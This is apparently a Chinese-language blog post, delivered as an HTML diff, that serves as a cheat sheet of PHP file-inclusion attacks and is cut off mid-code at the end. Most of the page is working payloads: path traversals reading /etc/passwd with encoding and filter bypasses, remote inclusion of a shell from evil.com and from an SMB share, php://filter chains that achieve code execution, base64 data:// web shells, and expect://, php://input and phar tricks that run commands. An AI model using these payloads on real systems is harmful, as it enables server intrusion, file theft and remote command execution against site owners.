@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+
+  
+
+  
+
+  
+    <meta name="author" content="John Doe">
+  
+
+  
+
+  
+
+  <title>文件包含 | Hexo</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  <!--mathjax latex数学公式显示支持-->
+  
+  
+
+  
+
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(/1.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          Hexo
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">文件包含</h1>
+          <h2 class="title-sub-wrap">
+            <strong>John Doe</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2024-11-04T16:00:00.000Z" itemprop="datePublished">2024-11-05</time>
+          </h2>
+          
+          
+          <ul class="wrap-list dark">
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/web%E6%BC%8F%E6%B4%9E/">🏷️ web漏洞</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h3 id=""><a href="#" class="headerlink" title=""></a></h3><span id="more"></span>
+
+
+
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>空字节（低于5.3.4）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
+
+<p>遍历</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=....//....//....//etc/passwd</span><br><span class="line">http://example.com/index.php?page=....\/....\/....\/etc/passwd</span><br><span class="line">http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>双编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd</span><br><span class="line">http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00</span><br></pre></td></tr></table></figure>
+
+<p>UTF8</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</span><br><span class="line">http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00</span><br></pre></td></tr></table></figure>
+
+<p>路径截断</br><br>在大多数 PHP 安装中，长度超过4096字节的文件名将被截断，因此任何多余的字符都将被丢弃</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]</span><br><span class="line">http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]</span><br><span class="line">http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]</span><br><span class="line">http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>基础过滤绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=....//....//etc/passwd</span><br><span class="line">http://example.com/index.php?page=..///////..////..//////etc/passwd</span><br><span class="line">http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>PHP5后默认配置不起作用，需要修改配置文件allow_url_include &#x3D; On</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=http://evil.com/shell.txt</span><br><span class="line">http://example.com/index.php?page=http://evil.com/shell.txt%00</span><br><span class="line">http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt</span><br></pre></td></tr></table></figure>
+
+<p>绕过allow_url_include</br><br>当allow_url_include和allow_url_fopen被设置为Off时，可以使用smb协议在Windows机器上包含远程文件</p>
+<ul>
+<li><ol>
+<li>创建一个向所有人开放的smb共享</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>写入一个shell.php文件，其中包含执行的PHP代码</li>
+</ol>
+</li>
+<li><ol start="3">
+<li>然后文件包含它，有效负载为<a target="_blank" rel="noopener" href="http://example.com/index.php?page=%5C%5C%E6%94%BB%E5%87%BB%E8%80%85%E4%B8%BB%E6%9C%BA%E5%9C%B0%E5%9D%80%5Cshare%5Cshell.php">http://example.com/index.php?page=\\攻击者主机地址\share\shell.php</a></li>
+</ol>
+</li>
+</ul>
+<p>可能含有文件包含漏洞的参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">cat</span>=&#123;payload&#125;</span><br><span class="line">?<span class="built_in">dir</span>=&#123;payload&#125;</span><br><span class="line">?action=&#123;payload&#125;</span><br><span class="line">?board=&#123;payload&#125;</span><br><span class="line">?<span class="built_in">date</span>=&#123;payload&#125;</span><br><span class="line">?detail=&#123;payload&#125;</span><br><span class="line">?file=&#123;payload&#125;</span><br><span class="line">?download=&#123;payload&#125;</span><br><span class="line">?path=&#123;payload&#125;</span><br><span class="line">?folder=&#123;payload&#125;</span><br><span class="line">?prefix=&#123;payload&#125;</span><br><span class="line">?include=&#123;payload&#125;</span><br><span class="line">?page=&#123;payload&#125;</span><br><span class="line">?inc=&#123;payload&#125;</span><br><span class="line">?locate=&#123;payload&#125;</span><br><span class="line">?show=&#123;payload&#125;</span><br><span class="line">?doc=&#123;payload&#125;</span><br><span class="line">?site=&#123;payload&#125;</span><br><span class="line">?<span class="built_in">type</span>=&#123;payload&#125;</span><br><span class="line">?view=&#123;payload&#125;</span><br><span class="line">?content=&#123;payload&#125;</span><br><span class="line">?document=&#123;payload&#125;</span><br><span class="line">?layout=&#123;payload&#125;</span><br><span class="line">?mod=&#123;payload&#125;</span><br><span class="line">?conf=&#123;payload&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP包装器和协议"><a href="#PHP包装器和协议" class="headerlink" title="PHP包装器和协议"></a>PHP包装器和协议</h2><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>filter有五类：</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.string.php">字符串过滤器</a></br></p>
+<ul>
+<li>string.rot13</li>
+<li>string.toupper</li>
+<li>string.tolower</li>
+<li>string.strip_tags</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.convert.php">转换过滤器</a></br></p>
+<ul>
+<li>convert.base64-encode</li>
+<li>convert.base64-decode</li>
+<li>convert.quoted-printable-encode</li>
+<li>convert.quoted-printable-decode</li>
+<li>convert.iconv.*</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.compression.php">压缩过滤器</a></br></p>
+<ul>
+<li>zlib.deflate</li>
+<li>zlib.inflate</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.encryption.php">加密过滤器</a></br></p>
+<ul>
+<li>mcrypt.*</li>
+<li>mdecrypt.*</li>
+</ul>
+<p>其它过滤器(运行var_dump(stream_get_filters());查看更多过滤器)</br></p>
+<ul>
+<li>consumed</li>
+<li>dechunk</li>
+<li>convert.*</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/etc/passwd</span><br><span class="line">php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd</span><br><span class="line"></span><br><span class="line">http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php</span><br><span class="line">http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php</span><br><span class="line">http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+
+<p>多个Base64编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s</span><br></pre></td></tr></table></figure>
+
+<p>多遍压缩</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/P0cL4bs/Kadimus</span><br><span class="line">./kadimus -u <span class="string">&quot;http://example.com/index.php?page=vuln&quot;</span> -S -f <span class="string">&quot;index.php%00&quot;</span> -O index.php --parameter page</span><br><span class="line"></span><br><span class="line">curl <span class="string">&quot;http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php&quot;</span> | <span class="built_in">base64</span> -d &gt; index.php</span><br></pre></td></tr></table></figure>
+
+<p>多种编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/synacktiv/php_filter_chain_generator</span><br><span class="line">$ python3 php_filter_chain_generator.py --chain <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span></span><br><span class="line">[+] The following gadget chain will generate the following code : &lt;?php phpinfo();?&gt; (<span class="built_in">base64</span> value: PD9waHAgcGhwaW5mbygpOz8+)</span><br><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</span><br></pre></td></tr></table></figure>
+
+<p>自定义Payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI2RCE.py</span><br><span class="line"><span class="comment"># vulnerable file: index.php</span></span><br><span class="line"><span class="comment"># vulnerable parameter: file</span></span><br><span class="line"><span class="comment"># executed command: id</span></span><br><span class="line"><span class="comment"># executed PHP code: &lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">curl <span class="string">&quot;127.0.0.1:8000/index.php?0=id&amp;file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="php-fd"><a href="#php-fd" class="headerlink" title="php:&#x2F;&#x2F;fd"></a>php:&#x2F;&#x2F;fd</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://fd/0</span><br></pre></td></tr></table></figure>
+
+<p>可以使用php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;stdout 和 php:&#x2F;&#x2F;stderr分别访问文件描述符0、1、2</p>
+<h3 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php phpinfo(); ?&gt;</span><br><span class="line">data:text/plain;<span class="built_in">base64</span>,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgaGVyZSEnOyA/Pg==&amp;cmd=<span class="string">&quot;id&quot;</span></span><br><span class="line"></span><br><span class="line">http://example.net/?page=data://text/plain,&lt;?php <span class="built_in">echo</span> base64_encode(file_get_contents(<span class="string">&quot;index.php&quot;</span>)); ?&gt;</span><br><span class="line">http://example.net/?page=data://text/plain,&lt;?php phpinfo(); ?&gt;</span><br><span class="line">http://example.net/?page=data://text/plain;<span class="built_in">base64</span>,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=</span><br><span class="line">http://example.net/?page=data:text/plain,&lt;?php <span class="built_in">echo</span> base64_encode(file_get_contents(<span class="string">&quot;index.php&quot;</span>)); ?&gt;</span><br><span class="line">http://example.net/?page=data:text/plain,&lt;?php phpinfo(); ?&gt;</span><br><span class="line">http://example.net/?page=data:text/plain;<span class="built_in">base64</span>,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=</span><br></pre></td></tr></table></figure>
+
+<p>绕过Chrome Auditor XSS检测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:application/x-httpd-php;<span class="built_in">base64</span>,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+</span><br></pre></td></tr></table></figure>
+
+<h3 id="expect"><a href="#expect" class="headerlink" title="expect:&#x2F;&#x2F;"></a>expect:&#x2F;&#x2F;</h3><p>需要激活expect</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?page=expect://id</span><br><span class="line">http://example.com/index.php?page=expect://ls</span><br></pre></td></tr></table></figure>
+
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data <span class="string">&quot;&lt;?php echo shell_exec(&#x27;id&#x27;); ?&gt;&quot;</span> <span class="string">&quot;http://目标WEB应用程序地址/文件包含漏洞页面.php?page=php://input%00&quot;</span> -k -v</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/P0cL4bs/Kadimus</span><br><span class="line">./kadimus -u <span class="string">&quot;https://example.com/index.php?page=php://input%00&quot;</span>  -C <span class="string">&#x27;&lt;?php echo shell_exec(&quot;id&quot;); ?&gt;&#x27;</span> -T input</span><br></pre></td></tr></table></figure>
+
+<h3 id="压缩包装器"><a href="#压缩包装器" class="headerlink" title="压缩包装器"></a>压缩包装器</h3><p>phpinfo.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zip 压缩包名.zip 包含页面.php</span><br><span class="line">rar a 压缩包名.rar 包含页面.php</span><br><span class="line"></span><br><span class="line">zip://路径/压缩包名.zip%23包含页面.php</span><br><span class="line">rar://路径/压缩包名.rar%23包含页面.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>exploit.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Running inside a PHAR!&#x27;</span> . PHP_EOL;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>eyi.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;malicious.phar&#x27;</span>);</span><br><span class="line">    <span class="comment">//创建一个PHAR</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;exploit.php&#x27;</span>, <span class="string">&#x27;&lt;?php echo &quot;Running inside a PHAR!&quot;; system(&quot;whoami&quot;); ?&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">//将可执行脚本添加到PHAR</span></span><br><span class="line">    <span class="variable">$defaultStub</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">createDefaultStub</span>(<span class="string">&#x27;exploit.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$stub</span> = <span class="string">&quot;#!/usr/bin/php \n&quot;</span> . <span 